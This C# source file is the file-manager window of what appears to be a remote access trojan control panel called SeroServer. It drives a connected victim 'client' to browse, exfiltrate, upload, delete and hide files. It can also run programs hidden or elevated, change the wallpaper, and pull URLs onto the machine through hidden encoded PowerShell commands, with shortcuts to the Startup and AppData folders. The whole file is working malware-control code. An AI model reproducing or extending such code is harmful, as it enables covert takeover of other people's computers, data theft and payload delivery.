using System.Collections.ObjectModel;
using System.IO;
using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FileManagerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<FileEntryVM> _entries = [];
    private readonly Stack<string> _history = new();
    private string _currentPath = "";

    // Pending async results
    private TaskCompletionSource<string>? _pendingList;
    private TaskCompletionSource<string>? _pendingData;
    private TaskCompletionSource<string>? _pendingHash;
    private TaskCompletionSource<string>? _pendingAck;

    public FileManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;
        GridFiles.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmFileData,   pkt => { _pendingData?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmHashResult,  pkt => { _pendingHash?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmAck,         pkt => { _pendingAck?.TrySetResult(pkt.Data); });

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.FmListResult);
            _server.UnregisterHandler(clientId, PacketType.FmFileData);
            _server.UnregisterHandler(clientId, PacketType.FmHashResult);
            _server.UnregisterHandler(clientId, PacketType.FmAck);
        };
        Loaded += async (_, _) => await Navigate("");
    }

    // ── Navigation ────────────────────────────────────

    private async Task Navigate(string path)
    {
        TxtStatus.Text = "Loading…";
        try
        {
            _pendingList = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmList,
                Data = JsonConvert.SerializeObject(new FmListData { Path = path })
            });

            var json = await _pendingList.Task.WaitAsync(TimeSpan.FromSeconds(15));
            var result = JsonConvert.DeserializeObject<FmListResultData>(json);
            if (result == null) { TxtStatus.Text = "No response."; return; }
            if (!string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result.Error}"; return; }

            if (!string.IsNullOrEmpty(_currentPath))
                _history.Push(_currentPath);

            _currentPath = result.Path;
            TxtPath.Text = _currentPath;
            _entries.Clear();
            foreach (var e in result.Entries.OrderByDescending(x => x.IsDir).ThenBy(x => x.Name))
                _entries.Add(new FileEntryVM(e));
            TxtStatus.Text = $"{result.Path}  —  {result.Entries.Count} item(s)";
        }
        catch (TimeoutException) { TxtStatus.Text = "Timeout."; }
        catch (Exception ex)    { TxtStatus.Text = ex.Message; }
        finally { _pendingList = null; }
    }

    // ── Context menu actions ──────────────────────────

    private async void Download_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name };
        if (dlg.ShowDialog() != true) return;

        TxtStatus.Text = $"Downloading {row.Name}…";
        try
        {
            _pendingData = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmDownload,
                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = _currentPath.TrimEnd('\\', '/') + "\\" + row.Name })
            });
            var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
            if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result?.Error}"; return; }
            await File.WriteAllBytesAsync(dlg.FileName, Convert.FromBase64String(result.Data));
            TxtStatus.Text = $"Downloaded: {dlg.FileName}";
        }
        catch (Exception ex) { TxtStatus.Text = ex.Message; }
        finally { _pendingData = null; }
    }

    private async void Upload_Click(object s, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
        if (dlg.ShowDialog() != true) return;
        var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
        TxtStatus.Text = $"Uploading {Path.GetFileName(dlg.FileName)}…";
        try
        {
            var bytes = await File.ReadAllBytesAsync(dlg.FileName);
            _pendingAck = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmUpload,
                Data = JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = Convert.ToBase64String(bytes) })
            });
            await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
            TxtStatus.Text = $"Uploaded: {Path.GetFileName(dlg.FileName)}";
            await Navigate(_currentPath);
        }
        catch (Exception ex) { TxtStatus.Text = ex.Message; }
        finally { _pendingAck = null; }
    }

    private async void Delete_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        if (MessageBox.Show($"Delete '{row.Name}'?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        var path = Path.Combine(_currentPath, row.Name);
        _pendingAck = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
        try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15)); } catch { }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void Rename_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var newName = PromptInput($"Rename '{row.Name}' to:", row.Name);
        if (string.IsNullOrWhiteSpace(newName) || newName == row.Name) return;
        var oldPath = Path.Combine(_currentPath, row.Name);
        var newPath = Path.Combine(_currentPath, newName);
        _pendingAck = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmRename, Data = JsonConvert.SerializeObject(new FmRenameData { OldPath = oldPath, NewPath = newPath }) });
        try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15)); } catch { }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void NewFolder_Click(object s, RoutedEventArgs e)
    {
        var name = PromptInput("New folder name:", "New Folder");
        if (string.IsNullOrWhiteSpace(name)) return;
        var path = Path.Combine(_currentPath, name);
        _pendingAck = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmMkDir, Data = JsonConvert.SerializeObject(new FmMkDirData { Path = path }) });
        try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15)); } catch { }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void Exec_Normal_Click(object s, RoutedEventArgs e) => await ExecFile("normal");
    private async void Exec_Hidden_Click(object s, RoutedEventArgs e) => await ExecFile("hidden");
    private async void Exec_Admin_Click(object s, RoutedEventArgs e)  => await ExecFile("runas");

    private async Task ExecFile(string mode)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmExec,
            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
        });
        TxtStatus.Text = $"Executed: {row.Name} ({mode})";
    }

    private async void Hash_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        TxtStatus.Text = "Computing hash…";
        _pendingHash = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmHash, Data = JsonConvert.SerializeObject(new FmHashData { Path = path }) });
        try
        {
            var json = await _pendingHash.Task.WaitAsync(TimeSpan.FromSeconds(30));
            var r = JsonConvert.DeserializeObject<FmHashResultData>(json);
            if (r != null && string.IsNullOrEmpty(r.Error))
            {
                Clipboard.SetText(r.Hash);
                MessageBox.Show($"SHA-256: {r.Hash}\n\n(copied to clipboard)", row.Name, MessageBoxButton.OK, MessageBoxImage.Information);
                TxtStatus.Text = $"Hash: {r.Hash[..16]}…";
            }
            else TxtStatus.Text = $"Hash error: {r?.Error}";
        }
        catch { TxtStatus.Text = "Hash timeout."; }
        finally { _pendingHash = null; }
    }

    private async void ShowHide_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmShowHide,
            Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
        });
        await Navigate(_currentPath);
    }

    private async void Wallpaper_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FunCmd,
            Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
        });
        TxtStatus.Text = $"Wallpaper set: {row.Name}";
    }

    private async void PlayMusic_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmExec,
            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
        });
        TxtStatus.Text = $"Playing: {row.Name}";
    }

    private async void Zip_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        var dest = path + ".zip";
        // Use PS encoded command — path passed via env var to avoid injection
        var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.AutoTaskShell,
            Data = $"SET SERO_SRC={path}&& SET SERO_DST={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
        });
        TxtStatus.Text = $"Zipping {row.Name}…";
        await Task.Delay(2000);
        await Navigate(_currentPath);
    }

    private async void DownloadUrl_Click(object s, RoutedEventArgs e)
    {
        var url = PromptInput("URL to download:", "https://");
        if (string.IsNullOrWhiteSpace(url)) return;

        // Validate URL before sending
        if (!Uri.TryCreate(url, UriKind.Absolute, out var parsedUri) ||
            (parsedUri.Scheme != "http" && parsedUri.Scheme != "https"))
        {
            TxtStatus.Text = "Invalid URL (must be http/https).";
            return;
        }

        var filename = Path.GetFileName(parsedUri.LocalPath);
        if (string.IsNullOrWhiteSpace(filename)) filename = "download";
        // Sanitize filename — strip any path separators
        filename = Path.GetFileName(filename);
        var dest = Path.Combine(_currentPath, filename);

        // Use PS encoded command — URL via env var to avoid injection
        var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.AutoTaskShell,
            Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
        });
        TxtStatus.Text = $"Downloading {filename}…";
        await Task.Delay(3000);
        await Navigate(_currentPath);
    }

    // ── Navigation buttons ──────────────────────────

    private async void Back_Click(object s, RoutedEventArgs e)
    {
        if (_history.TryPop(out var prev))
        {
            var saved = _currentPath;
            _currentPath = "";
            await Navigate(prev);
            // Don't push prev back
            if (_history.Count > 0 && _history.Peek() == prev)
                _history.Pop();
        }
        else
        {
            var parent = Path.GetDirectoryName(_currentPath);
            await Navigate(parent ?? "");
        }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Navigate(_currentPath);
    private async void GoPath_Click(object s, RoutedEventArgs e) => await Navigate(TxtPath.Text.Trim());
    private async void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Return) await Navigate(TxtPath.Text.Trim()); }

    private async void GoToDesktop_Click(object s, RoutedEventArgs e) => await Navigate("%USERPROFILE%\\Desktop");
    private async void GoToUser_Click(object s, RoutedEventArgs e)    => await Navigate("%USERPROFILE%");
    private async void GoToTemp_Click(object s, RoutedEventArgs e)    => await Navigate("%TEMP%");
    private async void GoToAppData_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%");
    private async void GoToStartup_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    private async void GridFiles_DoubleClick(object s, MouseButtonEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || !row.IsDir) return;
        var path = string.IsNullOrEmpty(_currentPath)
            ? row.Name
            : Path.Combine(_currentPath, row.Name);
        await Navigate(path);
    }

    // ── Helpers ─────────────────────────────────────

    private static string? PromptInput(string label, string defaultVal = "")
    {
        var dlg = new Window
        {
            Title = "Input", Width = 380, Height = 130,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = label, Foreground = System.Windows.Media.Brushes.White,
            FontSize = 12, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.TextBox
        {
            Text = defaultVal,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
            Foreground = System.Windows.Media.Brushes.White,
            BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88)),
            Padding = new Thickness(6, 4, 6, 4),
            Margin = new Thickness(0, 0, 0, 8)
        };
        sp.Children.Add(tb);
        var ok = new System.Windows.Controls.Button
        {
            Content = "OK", Width = 60, HorizontalAlignment = HorizontalAlignment.Right,
            Padding = new Thickness(10, 4, 10, 4)
        };
        ok.Click += (_, _) => { dlg.DialogResult = true; };
        sp.Children.Add(ok);
        dlg.Content = sp;
        tb.SelectAll(); tb.Focus();
        return dlg.ShowDialog() == true ? tb.Text : null;
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed) DragMove();
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public class FileEntryVM
{
    public string Icon       { get; }
    public string Name       { get; }
    public bool   IsDir      { get; }
    public bool   IsHidden   { get; }
    public string SizeDisplay{ get; }
    public string Modified   { get; }
    public string Attr       { get; }

    private static readonly Dictionary<string, string> ExtIcons = new(StringComparer.OrdinalIgnoreCase)
    {
        {".exe", "⚙"}, {".dll", "🔧"}, {".bat", "⚡"}, {".cmd", "⚡"}, {".ps1", "🔵"},
        {".txt", "📄"}, {".log", "📋"}, {".ini", "📋"}, {".cfg", "📋"}, {".conf", "📋"},
        {".zip", "📦"}, {".rar", "📦"}, {".7z", "📦"}, {".tar", "📦"}, {".gz", "📦"},
        {".mp3", "🎵"}, {".wav", "🎵"}, {".flac", "🎵"}, {".ogg", "🎵"},
        {".mp4", "🎬"}, {".avi", "🎬"}, {".mkv", "🎬"}, {".mov", "🎬"},
        {".jpg", "🖼"}, {".jpeg", "🖼"}, {".png", "🖼"}, {".gif", "🖼"}, {".bmp", "🖼"},
        {".pdf", "📕"}, {".doc", "📘"}, {".docx", "📘"}, {".xls", "📗"}, {".xlsx", "📗"},
        {".ppt", "📙"}, {".pptx", "📙"}, {".lnk", "🔗"}, {".url", "🌐"},
        {".iso", "💿"}, {".img", "💿"}
    };

    public FileEntryVM(FmEntry e)
    {
        Name     = e.Name;
        IsDir    = e.IsDir;
        IsHidden = e.IsHidden;
        Modified = e.Modified;
        Attr     = e.IsHidden ? "H" : "";

        if (e.IsDir)
        {
            Icon        = "📁";
            SizeDisplay = "<DIR>";
        }
        else
        {
            var ext = Path.GetExtension(e.Name);
            Icon        = ExtIcons.TryGetValue(ext, out var ico) ? ico : "📄";
            SizeDisplay = FormatSize(e.Size);
        }
    }

    private static string FormatSize(long bytes)
    {
        if (bytes < 1024)        return $"{bytes} B";
        if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F1} KB";
        return $"{bytes / (1024.0 * 1024):F1} MB";
    }
}
